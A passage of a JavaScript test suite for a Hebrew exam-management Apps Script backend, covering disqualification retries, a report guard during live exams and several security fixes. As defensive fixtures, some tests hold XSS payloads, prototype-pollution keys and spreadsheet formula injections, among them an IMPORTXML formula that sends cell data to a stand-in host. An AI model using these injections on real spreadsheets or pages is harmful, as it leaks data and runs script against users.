  assert.equal(again.duplicate, true);
  assert.equal(pending()[13], 1, 'counted once');
  assert.equal(dqRows(e, 1).length, 1, 'one result row');

  // The examiner overturns it…
  const overturn = get(e, { action: 'overturnDQ', origin: 'examiner-app', sessionCode: SESSION, idNumber: idOf(1),
    examinerId: '111111111', token: 'tokE' });
  assert.equal(overturn.status, 'ok');
  assert.equal(pending()[5], 'in_exam');

  // …and a retry that was still on its way lands afterwards.
  assert.equal(selfDq(e, 1, { reason: 'hidden-10s' }).status, 'ok');
  assert.equal(pending()[5], 'in_exam', 'the examiner\'s overturn stands');
  assert.equal(pending()[13], 1, 'and the counter still says one');
  assert.equal(pending()[16], 'פסילה: hidden-10s', 'column Q keeps the reason of the DQ that was overturned');

  // A NEW event after the overturn is a new disqualification, exactly as before.
  assert.equal(selfDq(e, 1, { reason: 'zoom-out', dqEventId: 'ev-1b' }).status, 'ok');
  assert.equal(pending()[5], 'disqualified');
  assert.equal(pending()[13], 2);
  assert.equal(pending()[16], 'פסילה: zoom-out');
});

test('r33 testGatewayReachability: a reachable Worker, a Cloudflare block and a key mismatch read differently; no secret is printed', () => {
  const e = runtime({});
  const calls = fetchSpy(e, url => {
    if (url === GATEWAY_URL + '/') return { code: 200, text: '{"status":"ok","service":"session-gateway","build":"2026-09-23.3","bank":"b"}' };
    if (url === GATEWAY_URL + '/v1/bank?grant=x.y') return { code: 403, text: '{"status":"error","code":"grant_invalid"}' };
    return { code: 200, text: JSON.stringify(workerBank([1])) };
  });
  const ok = e.ctx.testGatewayReachability();
  assert.match(ok, /front-door=200 worker \| fake-grant=403 worker \| real-grant=200 ok => OK - Google reaches the Worker/);
  assert.equal(calls.length, 3);
  const realGrant = decodeURIComponent(calls[2].url.split('grant=')[1]);
  assert.match(realGrant, /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/, 'the third probe is a real signed grant');
  const printed = e.logs.join('\n') + '\n' + ok;
  assert.ok(!printed.includes('secret-key'), 'the key is never printed');
  assert.ok(!printed.includes(realGrant.split('.')[1]), 'nor the real grant');
  assert.ok(!printed.includes('שאלה 1'), 'nor a question text');
  assert.ok(e.logs.some(l => l.startsWith('front-door GET / -> HTTP 200 [worker] {"status":"ok"')), e.logs.join('\n'));

  e.logs.length = 0;
  fetchSpy(e, () => ({ code: 403, text: 'error code: 1010' }));
  assert.match(e.ctx.testGatewayReachability(), /CLOUDFLARE BLOCKS GOOGLE/);
  assert.ok(e.logs.some(l => /HTTP 403 \[cloudflare-block\] error code: 1010/.test(l)), e.logs.join('\n'));

  fetchSpy(e, url => (url === GATEWAY_URL + '/' ? { code: 200, text: '{"status":"ok"}' } : { code: 403, text: '{"status":"error","code":"grant_invalid"}' }));
  assert.match(e.ctx.testGatewayReachability(), /refused a real grant - compare GATEWAY_KEY/);

  fetchSpy(e, () => new Error('DNS error: gw.example.workers.dev'));
  assert.match(e.ctx.testGatewayReachability(), /front-door=0 unreachable .*UNCLEAR/);

  e.properties.delete('GATEWAY_URL');
  assert.match(e.ctx.testGatewayReachability(), /GATEWAY_URL is not set/);
});

// ============================================================================
// 24/09/2026: no heavy report while exams are running. That morning a
// commander opened the commander dashboard three times (60 s, 55 s, 42 s) and a
// minute later the exam project's own open of the spreadsheet hung for 243 s.
// handleCommanderDashboard and handleCenterManagerReport now ask
// liveExamActivity() (86_commander.js) first and answer code 'exam_hours'
// instead of reading. These tests run the REPORTS build through its router —
// the file and the path that serve the two reports in production. The last one
// proves the path a commander uses DURING an exam (enter a session, view it,
// correct a score) is untouched, in the exam build and in the monolith.
// ============================================================================
const REPORTS_BUILD = 'external_exam_apps_script.reports.js';
const EXAM_BUILD = 'external_exam_apps_script.exam.js';
const MONOLITH_BUILD = 'external_exam_apps_script.js';
const MIN = 60000, HOUR = 3600000;
const at = ms => new Date(ms).toISOString();
const plainOf = v => JSON.parse(JSON.stringify(v));
// 'תוצאות' column A is todayStr(): DD/MM/YYYY HH:MM in local time.
function sheetDateOf(ms) {
  const d = new Date(ms), p = n => String(n).padStart(2, '0');
  return p(d.getDate()) + '/' + p(d.getMonth() + 1) + '/' + d.getFullYear() + ' ' + p(d.getHours()) + ':' + p(d.getMinutes());
}
const STAFF_HEADER = ['שם', 'ת.ז.', 'סיסמה', 'פעיל', 'מס בוחן', 'תפקיד', 'טוקן', 'תוקף טוקן', 'ניסיונות כושלים', 'נעילה עד', 'אתרים מנוהלים'];
function staff() {
  const until = at(NOW + 86400000);
  return [STAFF_HEADER,
    ['מפקד', '999999999', 'pw', 'כן', '99', 'מפקד', 'tokC', until, 0, '', ''],
    ['מפקד מרכז', '999999998', 'pw', 'כן', '98', 'מפקד מרכז', 'tokM', until, 0, '', 'בסיס 6'],
    ['בוחן א', '111111111', 'pw', 'כן', '7', 'בוחן', 'tokE', until, 0, '', '']];
}
const COMMANDER = { examinerId: '999999999', token: 'tokC' };
const CENTER = { examinerId: '999999998', token: 'tokM' };
const PLAIN_EXAMINER = { examinerId: '111111111', token: 'tokE' };
// K (10) = פעיל, J (9) = תקף עד.
const openSession = (code, over) =>
  sessionRow(Object.assign({ 0: code, 3: 'בסיס 6', 8: at(NOW - HOUR), 9: at(NOW + 7 * HOUR), 10: true }, over || {}));
// E (4) = registered, F (5) = status, L (11) = exam start ('' = never started).
const liveRow = (code, id, status, registered, started) =>
  pendingRow(id, { 0: code, 4: at(registered), 5: status, 11: started ? at(started) : '' });
const RESULTS_HEADER = ['תאריך', 'ת.ז.', 'שם', 'טלפון', 'דרגה', 'ציון', 'אחוז', 'עבר/נכשל', 'זמן', 'בוחן', 'אתר', 'כיתה',
  'שפה', 'קוד סשן', 'ניסיון', 'פירוט שגויות', 'נשלח?', 'פסול?', 'קישור וואטסאפ', 'אוכלוסיה', 'תוקן?', 'שמע', 'מאומת',
  'חשוד', 'dqEventId', 'תוקן ע"י', 'סיבת תיקון', 'תאריך תיקון', 'מסלול שפות', 'מכשיר'];
function resultRow(code, id, whenMs) {
  const row = new Array(30).fill('');
  row[0] = sheetDateOf(whenMs); row[1] = id; row[2] = 'נבחן ' + id; row[3] = '0500000000'; row[4] = 'B';
  row[5] = '24/30'; row[6] = '80%'; row[7] = 'נכשל'; row[8] = '30 דק\' 00 שנ\''; row[9] = 'בוחן א'; row[10] = 'בסיס 6';
  row[11] = '1'; row[12] = 'he'; row[13] = code; row[14] = 1; row[19] = 'חיילים'; row[21] = 'off'; row[22] = 'מאומת';
  return row;
}
// The exam morning: five examinees live in two sessions, and one row of every
// kind that must NOT count.
function examMorning() {
  return {
    'סשנים': [SESSIONS_HEADER, openSession('LIVE0001'), openSession('LIVE0002'),
      openSession('CLOSED01', { 10: false }), openSession('EXPIRED1', { 9: at(NOW - MIN) })],
    'ממתינים': [PENDING_HEADER,
      liveRow('LIVE0001', idOf(1), 'in_exam', NOW - 20 * MIN, NOW - 10 * MIN),
      liveRow('LIVE0001', idOf(2), 'in_exam', NOW - 20 * MIN, NOW - 10 * MIN),
      liveRow('LIVE0001', idOf(3), 'approved', NOW - 5 * MIN),
      liveRow('LIVE0001', idOf(4), 'waiting', NOW - MIN),
      liveRow('LIVE0002', idOf(5), 'in_exam', NOW - 3 * HOUR, NOW - 90 * MIN),       // registered long ago: the START decides
      liveRow('LIVE0001', idOf(6), 'completed', NOW - 50 * MIN, NOW - 45 * MIN),     // finished
      liveRow('LIVE0001', idOf(7), 'waiting', NOW - 3 * HOUR),                       // abandoned in the queue
      liveRow('LIVE0002', idOf(8), 'in_exam', NOW - 3 * HOUR, NOW - 2 * HOUR - MIN),  // never finished
      liveRow('CLOSED01', idOf(9), 'in_exam', NOW - 20 * MIN, NOW - 10 * MIN),       // K is FALSE
      liveRow('EXPIRED1', idOf(10), 'waiting', NOW - 10 * MIN),                      // J has passed
      liveRow('NOSUCH01', idOf(11), 'in_exam', NOW - 20 * MIN, NOW - 10 * MIN)],     // no such session
    'תוצאות': [RESULTS_HEADER, resultRow('LIVE0001', idOf(6), NOW - 40 * MIN)]
  };
}
function guardEnv(sheets, serverFile) {
  return createEnv({ serverFile: serverFile || REPORTS_BUILD, now: NOW, properties: Object.assign({}, GATEWAY_PROPS),
    sheets: Object.assign({ 'בוחנים': staff(), 'סשנים': [SESSIONS_HEADER], 'ממתינים': [PENDING_HEADER],
      'תוצאות': [RESULTS_HEADER] }, sheets || {}) });
}
const RANGE = { dateFrom: '01/09/2026', dateTo: '22/09/2026' };
const commanderDash = (e, extra) =>
  get(e, Object.assign({ action: 'commanderDashboard', origin: 'examiner-app' }, COMMANDER, RANGE, extra || {}));
const centerReport = (e, who, extra) =>
  get(e, Object.assign({ action: 'centerManagerReport', origin: 'examiner-app' }, who || CENTER, extra || {}));
const examHoursMessage = (examinees, sessions) => 'יש עכשיו בחינות פעילות — ' + examinees + ' נבחנים ב-' + sessions +
  ' סשנים. הדוחות נחסמים בזמן בחינות כדי לא להאט את המבחנים. נסה שוב כשהבחינות יסתיימו.';
const noteRows = e => (e.sheets.get('אבחון') ? e.rows('אבחון') : []).filter(r => r[1] === 'NOTE');

test('exam hours: a live exam refuses both reports — with the counts, and before any heavy read', () => {
  const e = guardEnv(examMorning());
  const marks = [], realMark = e.ctx.diagMark;
  e.ctx.diagMark = phase => { marks.push(String(phase)); return realMark(phase); };
  e.resetCounters();
  const refusal = { status: 'error', code: 'exam_hours', retryable: false, live: { sessions: 2, examinees: 5 },
    message: examHoursMessage(5, 2) };
  assert.deepEqual(commanderDash(e), refusal);
  assert.ok(marks.includes('sheet:live-exams'), 'the guard marks its reads: ' + marks.join(' '));
  assert.deepEqual(centerReport(e), refusal);
  assert.ok(!marks.some(m => /commander|center-report/.test(m)), 'no read of either report began: ' + marks.join(' '));
  const c = e.counters();
  for (const name of ['תוצאות', 'תוצאות תרגול', 'תוצאות_ארכיון', 'ממתינים_ארכיון', 'כיתות']) {
    const s = c.perSheet[name];
    assert.ok(!s || s.fullReads + s.rangeReads === 0, name + ' was read: ' + JSON.stringify(s));
  }
  assert.equal(c.appends + c.setValues, 0, 'a refusal writes nothing');
  assert.equal(noteRows(e).length, 0, 'and records nothing');
});

test('exam hours: nothing live — both reports run; with no session open ממתינים is not even read', () => {
  const idle = guardEnv({ 'סשנים': [SESSIONS_HEADER, openSession('LIVE0001')],   // open, nobody registered yet
    'תוצאות': [RESULTS_HEADER, resultRow('LIVE0001', idOf(6), NOW - 40 * MIN)] });
  const cmd = commanderDash(idle);
  assert.equal(cmd.status, 'ok');
  assert.equal(cmd.data.overall.total, 1, 'the report really ran');
  const center = centerReport(idle);
  assert.equal(center.status, 'ok');
  assert.equal(center.overall.total, 1);

  const closed = guardEnv({ 'סשנים': [SESSIONS_HEADER, openSession('CLOSED01', { 10: false })],
    'ממתינים': [PENDING_HEADER, liveRow('CLOSED01', idOf(1), 'in_exam', NOW - 20 * MIN, NOW - 10 * MIN)] });
  closed.resetCounters();
  assert.deepEqual(plainOf(closed.ctx.liveExamActivity()), { sessions: 0, examinees: 0 });
  const pend = closed.counters().perSheet['ממתינים'];
  assert.equal(pend.fullReads + pend.rangeReads, 0, 'no open session: the tail read is skipped');
  assert.equal(commanderDash(closed).status, 'ok');
});

test('exam hours: a row whose start — or its registration, when it never started — is over two hours old does not block', () => {
  const e = guardEnv({ 'סשנים': [SESSIONS_HEADER, openSession('LIVE0001')],
    'ממתינים': [PENDING_HEADER,
      liveRow('LIVE0001', idOf(1), 'in_exam', NOW - 3 * HOUR, NOW - 2 * HOUR - MIN),
      liveRow('LIVE0001', idOf(2), 'approved', NOW - 2 * HOUR - MIN),
      liveRow('LIVE0001', idOf(3), 'waiting', NOW - 5 * HOUR)] });
  assert.deepEqual(plainOf(e.ctx.liveExamActivity()), { sessions: 0, examinees: 0 });
  assert.equal(commanderDash(e).status, 'ok');
  assert.equal(centerReport(e).status, 'ok');
  // One minute inside the window it counts again — whichever form Sheets hands
  // the time back in: ISO text (what nowISO() writes), a Date, or DD/MM/YYYY HH:MM.
  const rows = e.rows('ממתינים');
  rows[1][11] = at(NOW - 2 * HOUR + MIN);
  assert.deepEqual(plainOf(e.ctx.liveExamActivity()), { sessions: 1, examinees: 1 });
  rows[1][11] = new Date(NOW - 2 * HOUR + MIN);
  assert.equal(e.ctx.liveExamActivity().examinees, 1, 'a Date');
  rows[2][4] = sheetDateOf(NOW - 30 * MIN);
  assert.equal(e.ctx.liveExamActivity().examinees, 2, 'DD/MM/YYYY HH:MM');
  assert.equal(commanderDash(e).code, 'exam_hours');
});

test('exam hours: only an open session counts — K TRUE (or the text TRUE) and J not passed; an empty J is no expiry', () => {
  const cases = [
    [{ 10: false }, 0], [{ 10: 'FALSE' }, 0], [{ 10: '' }, 0], [{ 9: at(NOW - MIN) }, 0],
    [{ 10: 'TRUE' }, 1], [{ 9: '' }, 1], [{}, 1]
  ];
  for (const [over, expected] of cases) {
    const e = guardEnv({ 'סשנים': [SESSIONS_HEADER, openSession('S0000001', over)],
      'ממתינים': [PENDING_HEADER, liveRow('S0000001', idOf(1), 'in_exam', NOW - 20 * MIN, NOW - 10 * MIN)] });
    const label = JSON.stringify(over);
    assert.equal(e.ctx.liveExamActivity().examinees, expected, label);
    assert.equal(commanderDash(e).code === 'exam_hours', expected === 1, label);
  }
});

test('exam hours: force=1 runs the report anyway and leaves one NOTE row per override in אבחון', () => {
  const e = guardEnv(examMorning());
  const cmd = commanderDash(e, { force: '1' });
  assert.equal(cmd.status, 'ok');
  assert.equal(cmd.data.overall.total, 1);
  assert.equal(centerReport(e, CENTER, { force: '1' }).status, 'ok');
  assert.deepEqual(plainOf(noteRows(e).map(r => r.slice(1))), [
    ['NOTE', 'GET', 'commanderDashboard', '', 'force=1', 'exam_hours override by 999999999: 5 examinees in 2 sessions'],
    ['NOTE', 'GET', 'centerManagerReport', '', 'force=1', 'exam_hours override by 999999998: 5 examinees in 2 sessions']]);
  for (const force of ['true', 'yes', '0', '11', ' 1']) assert.equal(commanderDash(e, { force }).code, 'exam_hours', 'force=' + force);
  // With nothing live, force=1 is an ordinary request: there is nothing to record.
  const quiet = guardEnv({ 'סשנים': [SESSIONS_HEADER, openSession('LIVE0001')] });
  assert.equal(commanderDash(quiet, { force: '1' }).status, 'ok');
  assert.equal(noteRows(quiet).length, 0);
});

test('exam hours: whoever may not see the report gets the same answer as before, and the guard is not asked', () => {
  const e = guardEnv(examMorning());
  e.resetCounters();
  assert.deepEqual(get(e, Object.assign({ action: 'commanderDashboard', origin: 'examiner-app' }, PLAIN_EXAMINER, RANGE)),
    { status: 'error', message: 'אין הרשאת מפקד' });
  assert.deepEqual(centerReport(e, PLAIN_EXAMINER), { status: 'error', message: 'פעולה זו זמינה רק למפקד' });
  assert.deepEqual(centerReport(e, COMMANDER), { status: 'error', message: 'פעולה זו זמינה רק למפקד' }, 'a מפקד is not a center commander');
  const pend = e.counters().perSheet['ממתינים'];
  assert.equal(pend.fullReads + pend.rangeReads, 0, 'a refused role never reaches the guard\'s read');
  assert.equal(commanderDash(e, { token: 'stolen' }).tokenExpired, true, 'the router\'s token check is first, as always');
  e.rows('בוחנים')[2][10] = '';   // a center commander with no sites keeps his configuration error
  assert.deepEqual(centerReport(e), { status: 'error', message: 'לא הוקצו אתרים מנוהלים — פנה למנהל המערכת' });
});

test('exam hours: the guard fails OPEN — when its own read throws, the report runs', () => {
  const e = guardEnv(examMorning());
  e.ctx.readPendingTail = () => { throw new Error('Service Spreadsheets timed out while accessing document'); };
  assert.deepEqual(plainOf(e.ctx.liveExamActivity()), { sessions: 0, examinees: 0, error: true });
  assert.equal(commanderDash(e).status, 'ok');
  assert.equal(centerReport(e).status, 'ok');
  const e2 = guardEnv(examMorning());
  e2.ctx.sessionRows = () => { throw new Error('Service Spreadsheets failed'); };
  assert.equal(e2.ctx.liveExamActivity().error, true);
  assert.equal(centerReport(e2).status, 'ok');
  assert.equal(commanderDash(e2).status, 'ok');
});

// Yossi, 24/09: the commander's own tab — "📂 הצג כל הסשנים הפעילים" → enter a
// session → view it → correct a score — is used exactly while exams run and
// must never be blocked. Those are exam actions; this proves they answer as
// always at the same moment the report is refused.
test('exam hours: at the same moment a commander still lists the live sessions, enters one and corrects a score', () => {
  for (const file of [EXAM_BUILD, MONOLITH_BUILD]) {
    const e = guardEnv(examMorning(), file);
    assert.equal(commanderDash(e).code, file === EXAM_BUILD ? 'wrong_deployment' : 'exam_hours', file);
    const listed = get(e, Object.assign({ action: 'listAllSessions', origin: 'examiner-app' }, COMMANDER));
    assert.equal(listed.status, 'ok', file);
    assert.deepEqual(listed.sessions.map(s => s.code).sort(), ['LIVE0001', 'LIVE0002'], file);
    const board = get(e, Object.assign({ action: 'examinerDashboard', origin: 'examiner-app', sessionCode: 'LIVE0001' }, COMMANDER));
    assert.equal(board.status, 'ok', file);
    assert.deepEqual(board.active.map(a => String(a.idNumber)).sort(), [idOf(1), idOf(2)], file);
    const corrected = e.json(e.ctx.doPost({ postData: { contents: JSON.stringify(Object.assign({ action: 'commanderCorrectResult',
      origin: 'examiner-app', sessionCode: 'LIVE0001', idNumber: idOf(6), newScore: 27, newTotal: 30, newStatus: 'עבר',
      reason: 'ועדת ערר' }, COMMANDER)) } }));
    assert.deepEqual(corrected, { status: 'ok' }, file);
    const row = e.rows('תוצאות').find(r => String(r[1]) === idOf(6));
    assert.deepEqual([row[5], row[7], row[20]], ['27/30', 'עבר', true], file);
  }
});

// ---- r35 (25/09/2026): the server security holes (KNOWN_ISSUES #43) ---------
// Source: docs_private/research_2026-09-25/09_security_privacy_review.md §1-§3.2
// and 01_server_inventory.md §8. Each block below is one hole, closed.
const OTHER_EXAMINER = { examinerId: '222222222', token: 'tokB' };
function r35Staff() {
  const until = at(NOW + 86400000);
  return staff().concat([
    ['בוחן ב', '222222222', 'pw', 'כן', '8', 'בוחן', 'tokB', until, 0, '', ''],
    ['בוחן מושבת', '333333333', 'pw', 'לא', '9', 'בוחן', 'tokD', until, 0, '', '']]);
}
const EXTENSIONS_HEADER = ['תאריך', 'קוד סשן', 'ת.ז.', 'שם', 'דקות', 'סיבה', 'בוחן'];
// LIVE0001 belongs to 111111111 (PLAIN_EXAMINER): one examinee in the exam, one waiting.
function r35Env(extraSheets, serverFile) {
  return createEnv({ serverFile: serverFile || EXAM_BUILD, now: NOW, properties: Object.assign({}, GATEWAY_PROPS),
    sources: ['deployment/answer_key.gs'],
    sheets: Object.assign({ 'בוחנים': r35Staff(), 'סשנים': [SESSIONS_HEADER, openSession('LIVE0001')],
      'ממתינים': [PENDING_HEADER, liveRow('LIVE0001', idOf(1), 'in_exam', NOW - 20 * MIN, NOW - 10 * MIN),
        liveRow('LIVE0001', idOf(4), 'waiting', NOW - MIN)],
      'תוצאות': [RESULTS_HEADER], 'מבחנים': [Array(6).fill('h')], 'הארכות זמן': [EXTENSIONS_HEADER] }, extraSheets || {}) });
}
const pendingStatusOf = (e, id) => e.rows('ממתינים').filter(r => String(r[1]) === id).map(r => r[5]).pop();

test('r35 F-06: examinerDashboard — the session\'s own examiner and a מפקד read the board; any other examiner is refused', () => {
  const e = r35Env();
  const board = (who, code) => get(e, Object.assign({ action: 'examinerDashboard', origin: 'examiner-app',
    sessionCode: code || 'LIVE0001' }, who));
  const own = board(PLAIN_EXAMINER);
  assert.equal(own.status, 'ok');
  assert.deepEqual(own.active.map(a => String(a.idNumber)), [idOf(1)]);
  assert.equal(e.cache.get('qv2_sview_111111111_LIVE0001'), '1', 'the owner\'s verdict is cached, so the board pays for סשנים once');
  const commander = board(COMMANDER);
  assert.equal(commander.status, 'ok', 'the commander\'s foreign-session view (listAllSessions → loadForeignSession) still works');
  assert.deepEqual(commander.active.map(a => String(a.idNumber)), [idOf(1)]);

  e.resetCounters();
  const other = board(OTHER_EXAMINER);
  assert.deepEqual(other, { status: 'error', code: 'not_session_owner', message: 'אין הרשאה — בוחן לא תואם לסשן' });
  assert.equal(JSON.stringify(other).indexOf(idOf(1)), -1, 'not one ID number leaves');
  const c = e.counters();
  assert.equal(c.appends + c.setValues, 0, 'a refusal runs none of the board\'s reconciliation writes');
  assert.equal(c.perSheet['ממתינים'].rangeReads + c.perSheet['ממתינים'].fullReads, 0, 'nor reads the session');
  assert.equal(e.cache.get('qv2_sview_222222222_LIVE0001'), null, 'a refusal is never cached');

  assert.equal(board(CENTER).code, 'not_session_owner', 'a center commander has no session boards (his screen is a report)');
  assert.equal(board(PLAIN_EXAMINER, 'NOSUCH01').code, 'not_session_owner', 'a session that does not exist');
  assert.equal(board({ examinerId: '111111111', token: 'stolen' }).tokenExpired, true, 'the token check still comes first');
  assert.equal(e.ctx.apiRegistry().examinerDashboard.auth, 'examinerSession');
});

test('r35 D6: cancelDisqualify is gone — the examinee token no longer undoes a disqualification', () => {
  const dqRow = resultRow('LIVE0001', idOf(1), NOW - MIN);
  dqRow[5] = '0/30'; dqRow[7] = 'פסול'; dqRow[17] = true; dqRow[24] = 'e1';
  const e = r35Env({ 'ממתינים': [PENDING_HEADER, liveRow('LIVE0001', idOf(1), 'disqualified', NOW - 20 * MIN, NOW - 10 * MIN)],
    'תוצאות': [RESULTS_HEADER, dqRow] });
  const body = { action: 'cancelDisqualify', sessionCode: 'LIVE0001', idNumber: idOf(1), examineeToken: 'token-' + idOf(1), dqEventId: 'e1' };
  for (const reply of [get(e, body), postJson(e, body)]) {
    assert.equal(reply.status, 'error');
    assert.equal(reply.code, 'action_removed');
  }
  assert.equal(pendingStatusOf(e, idOf(1)), 'disqualified', 'the examiner still has the decision in front of him');
  assert.equal(e.rows('תוצאות')[1][7], 'פסול');
  assert.equal(typeof e.ctx.handleCancelDisqualify, 'undefined', 'the old handler is not in the file at all');
});

test('r35 D7: cancelRegistration needs the examinee token of the row it cancels', () => {
  const e = r35Env();
  const cancel = extra => get(e, Object.assign({ action: 'cancelRegistration', sessionCode: 'LIVE0001', idNumber: idOf(4) }, extra));
  assert.equal(cancel({}).examineeTokenError, 'missing', 'the classroom-griefing call: code + ID, no token, no phone');
  assert.equal(cancel({ phone: '' }).examineeTokenError, 'missing');
  assert.equal(cancel({ examineeToken: 'token-' + idOf(1) }).examineeTokenError, 'mismatch', 'a classmate\'s own token');
  assert.equal(pendingStatusOf(e, idOf(4)), 'waiting', 'nothing was cancelled');
  assert.equal(cancel({ examineeToken: 'token-' + idOf(4) }).status, 'ok', 'the examinee\'s own page (its decorator attaches the token)');
  assert.equal(pendingStatusOf(e, idOf(4)), 'cancelled');
});

test('r35 D8: markFinished needs the token when the row has one', () => {
  const e = r35Env();
  const mark = extra => postJson(e, Object.assign({ action: 'markFinished', sessionCode: 'LIVE0001', idNumber: idOf(1) }, extra));
  const row = () => e.rows('ממתינים').find(r => String(r[1]) === idOf(1));
  assert.equal(mark({}).examineeTokenError, 'missing');
  assert.equal(mark({ examineeToken: 'token-' + idOf(4) }).examineeTokenError, 'mismatch');
  assert.equal(row()[18] || '', '', '"סיים — מסנכרן" was not put on someone else\'s row');
  assert.equal(mark({ examineeToken: 'token-' + idOf(1) }).status, 'ok');
  assert.ok(row()[18], 'the examinee\'s own beacon still marks the row');
});

test('r35 D9: addExamTime — the same grant again within two minutes is the retry, not a second grant', () => {
  const e = r35Env();
  const add = extra => get(e, Object.assign({ action: 'addExamTime', origin: 'examiner-app', sessionCode: 'LIVE0001',
    idNumber: idOf(1), minutes: '10', reason: 'פינוי למרחב מוגן' }, PLAIN_EXAMINER, extra || {}));
  const first = add();
  assert.equal(first.status, 'ok');
  assert.equal(first.totalExtraMinutes, 10);
  const retry = add();
  assert.equal(retry.status, 'ok');
  assert.equal(retry.duplicate, true);
  assert.equal(retry.addedMinutes, 10);
  assert.equal(retry.totalExtraMinutes, 10, 'the examinee got the ten minutes once');
  assert.equal(e.rows('הארכות זמן').length, 2, 'one audit row');
  // Another amount, another reason or another examinee is a new grant.
  assert.equal(add({ minutes: '5' }).totalExtraMinutes, 15);
  assert.equal(add({ reason: 'תקלה טכנית' }).totalExtraMinutes, 25);
  // After the window the same grant is a real second grant again.
  e.clock.t += 2 * MIN + 1000;
  const later = add();
  assert.equal(later.duplicate, undefined);
  assert.equal(later.totalExtraMinutes, 35);
  assert.equal(e.rows('הארכות זמן').length, 5);
  // The ownership rule is unchanged: another examiner still gets nothing.
  assert.equal(add(OTHER_EXAMINER).message, 'אין הרשאה — בוחן לא תואם לסשן');
});

test('r35 F-02c: startPractice mode=ids is refused for a national ID in a live exam; everyone else practises', () => {
  const e = runtime({ sheets: { 'ממתינים': [PENDING_HEADER,
    pendingRow(idOf(1), { 5: 'in_exam' }), pendingRow(idOf(2), { 5: 'approved' }), pendingRow(idOf(4), { 5: 'waiting' }),
    pendingRow(idOf(5), { 5: 'in_exam', 4: at(NOW - 9 * HOUR) }), pendingRow(idOf(6), { 5: 'completed' })] } });
  const ids = Object.keys(e.ctx.questionIndex()).slice(0, 5).join(',');
  const byIds = extra => get(e, Object.assign({ action: 'startPractice', mode: 'ids', license: 'B', language: 'he', ids }, extra));
  for (const who of [{ standaloneIdNumber: idOf(1) }, { idNumber: idOf(1) }, { studentId: idOf(1) }, { standaloneIdNumber: idOf(2) }]) {
    const refused = byIds(who);
    assert.deepEqual(refused, { status: 'error', code: 'practice_ids_refused', message: 'תרגול לפי רשימת שאלות אינו זמין כעת' },
      JSON.stringify(who));
  }
  assert.equal(byIds({ standaloneIdNumber: idOf(4) }).status, 'ok', 'waiting is not an attempt yet');
  assert.equal(byIds({ standaloneIdNumber: idOf(5) }).status, 'ok', 'a row older than the 8 h session lifetime');
  assert.equal(byIds({ standaloneIdNumber: idOf(6) }).status, 'ok', 'a finished attempt');
  e.resetCounters();
  const student = byIds({ studentId: 'S-3f9a' });
  assert.equal(student.status, 'ok', 'student.html names no national ID (its studentId is S + a hash)');
  assert.equal(student.questions.length, 5);
  const pend = e.counters().perSheet['ממתינים'];
  assert.equal(pend.fullReads + pend.rangeReads, 0, 'and pays no read for the check');
  assert.equal(get(e, { action: 'startPractice', mode: 'exam', license: 'B', standaloneIdNumber: idOf(1) }).status, 'ok',
    'only mode=ids is refused');
});

test('r35 D23: a disabled examiner\'s token stops working — verifyToken checks "פעיל", like login does', () => {
  const e = r35Env();
  const list = who => get(e, Object.assign({ action: 'listSessions', origin: 'examiner-app' }, who));
  assert.equal(list({ examinerId: '333333333', token: 'tokD' }).tokenExpired, true);
  assert.equal(list(PLAIN_EXAMINER).status, 'ok');
});

test('r35 F-08: submitPracticeResult stores only the modes and licences student.html sends, and text as text', () => {
  const e = runtime();
  const send = extra => postJson(e, Object.assign({ action: 'submitPracticeResult', origin: 'student-app', studentId: 'S-1',
    studentName: 'תלמיד', mode: 'exam', license: 'B', score: 10, total: 30, percent: 33, time: '10:00' }, extra || {}));
  for (const bad of [{ mode: '<img src=x onerror=alert(1)>' }, { license: '<script>alert(1)</script>' }, { mode: 'review' },
    { license: 'Z' }, { license: 'constructor' }, { license: '__proto__' }]) {
    assert.deepEqual(send(bad), { status: 'error', code: 'invalid_practice_result', message: 'נתוני תרגול לא תקינים' }, JSON.stringify(bad));
  }
  const sheet = () => (e.sheets.get('תוצאות תרגול') ? e.rows('תוצאות תרגול') : [[]]);
  assert.equal(sheet().length, 1, 'no refused row was written');
  assert.equal(send().status, 'ok');
  assert.equal(send({ mode: 'category', license: 'C1' }).status, 'ok');
  assert.equal(send({ studentName: '=IMPORTXML("https://x.invalid/?"&A1,"//a")', phone: '+972500000000' }).status, 'ok');
  const row = sheet().at(-1);
  assert.equal(row[2], '\'=IMPORTXML("https://x.invalid/?"&A1,"//a")', 'stored as text, never as a formula');
  assert.equal(row[15], '\'+972500000000');
  assert.equal(sheet().length, 4);
});

test('r35 F-15: a registration stores what the examinee typed as text, never as a formula', () => {
  const e = runtime({ sheets: { 'ממתינים': [PENDING_HEADER] } });
  const reply = get(e, { action: 'registerExaminee', sessionCode: SESSION, idNumber: '900000077',
    fullName: '=HYPERLINK("https://x.invalid","x")', phone: '+972501112233', population: '@pop', site: '-site',
    language: 'he', license: 'B' });
  assert.equal(reply.status, 'ok');
  const row = e.rows('ממתינים').at(-1);
  assert.deepEqual([row[1], row[2], row[3], row[6], row[7], row[8], row[17]],
    ['900000077', '\'=HYPERLINK("https://x.invalid","x")', '\'+972501112233', 'he', '\'@pop', 'B', '\'-site']);
});

test('r35: cellSafe prefixes exactly the formula starters and leaves everything else alone', () => {
  const e = runtime();
  for (const s of ['=1+1', '+1', '-1', '@a', '\t=1', '\r=1']) assert.equal(e.ctx.cellSafe(s), '\'' + s, JSON.stringify(s));
  for (const v of ['', 'דני', '0501234567', ' =1', 'a=b', 12, true, null, undefined]) assert.equal(e.ctx.cellSafe(v), v, JSON.stringify(v));
});

// r35 (KNOWN_ISSUES #44): a site that moved to the new system can no longer open
// a session on the old one. Script Property MOVED_SITES (JSON array of site
// names); MOVED_SITES_URL is quoted in the refusal. Open sessions run on.
test('r35 MOVED_SITES: a moved site opens no new session, its open session runs on, and unset changes nothing', () => {
  const create = (e, extra) => get(e, Object.assign({ action: 'createSession', origin: 'examiner-app', site: 'בסיס 6',
    classroom: '1', license: 'B', language: 'he', audioMode: 'off',
    quotas: JSON.stringify([{ license: 'B', requested: 10, approved: 10 }]) }, PLAIN_EXAMINER, extra || {}));
  const health = e => get(e, { action: 'health' });

  const unset = r35Env();
  assert.equal(create(unset).status, 'ok', 'no property: behaviour unchanged');
  assert.equal(health(unset).movedSites, 0);
  for (const empty of ['', '[]', '  ']) {
    unset.properties.set('MOVED_SITES', empty);
    assert.equal(create(unset).status, 'ok', 'empty value ' + JSON.stringify(empty));
  }

  const e = r35Env();
  e.properties.set('MOVED_SITES', JSON.stringify(['בסיס 6', ' בסיס  9 ']));
  const sessionsBefore = e.rows('סשנים').length;
